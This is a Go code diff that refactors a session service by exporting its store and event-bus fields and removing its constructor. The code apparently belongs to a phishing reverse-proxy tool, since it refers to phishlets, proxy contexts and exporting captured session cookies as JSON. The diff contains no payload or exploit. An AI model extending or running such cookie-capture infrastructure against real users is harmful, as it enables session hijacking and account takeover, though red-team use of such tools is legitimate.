@@ -163,45 +163,41 @@ type CookieExport struct {
 
 // SessionService owns all business logic for session lifecycle.
 type SessionService struct {
-	store SessionStore
-	bus   EventBus
-}
-
-func NewSessionService(store SessionStore, bus EventBus) *SessionService {
-	return &SessionService{store: store, bus: bus}
+	Store SessionStore
+	Bus   EventBus
 }
 
 func (s *SessionService) Create(session *Session) error {
-	if err := s.store.CreateSession(session); err != nil {
+	if err := s.Store.CreateSession(session); err != nil {
 		return err
 	}
-	s.bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: session})
+	s.Bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: session})
 	return nil
 }
 
 func (s *SessionService) Complete(id string) error {
-	session, err := s.store.GetSession(id)
+	session, err := s.Store.GetSession(id)
 	if err != nil {
 		return err
 	}
 	session.Complete()
-	if err := s.store.UpdateSession(session); err != nil {
+	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-	s.bus.Publish(Event{Type: EventSessionCompleted, OccurredAt: time.Now(), Payload: session})
+	s.Bus.Publish(Event{Type: EventSessionCompleted, OccurredAt: time.Now(), Payload: session})
 	return nil
 }
 
 func (s *SessionService) Get(id string) (*Session, error) {
-	return s.store.GetSession(id)
+	return s.Store.GetSession(id)
 }
 
 func (s *SessionService) List(f SessionFilter) ([]*Session, error) {
-	return s.store.ListSessions(f)
+	return s.Store.ListSessions(f)
 }
 
 func (s *SessionService) Delete(id string) error {
-	return s.store.DeleteSession(id)
+	return s.Store.DeleteSession(id)
 }
 
 // NewSessionFromContext creates and persists a new session seeded from the
@@ -224,10 +220,10 @@ func (s *SessionService) NewSessionFromContext(ctx *ProxyContext) (*Session, err
 	if ctx.Phishlet != nil {
 		sess.Phishlet = ctx.Phishlet.Name
 	}
-	if err := s.store.CreateSession(sess); err != nil {
+	if err := s.Store.CreateSession(sess); err != nil {
 		return nil, fmt.Errorf("creating session: %w", err)
 	}
-	s.bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
+	s.Bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
 	return sess, nil
 }
 
@@ -253,7 +249,7 @@ func newSessionID() (string, error) {
 // ExportCookiesJSON returns the captured cookies for a session as a JSON byte
 // slice ready to be sent to the API caller or written to a file.
 func (s *SessionService) ExportCookiesJSON(id string) ([]byte, error) {
-	session, err := s.store.GetSession(id)
+	session, err := s.Store.GetSession(id)
 	if err != nil {
 		return nil, err
 	}
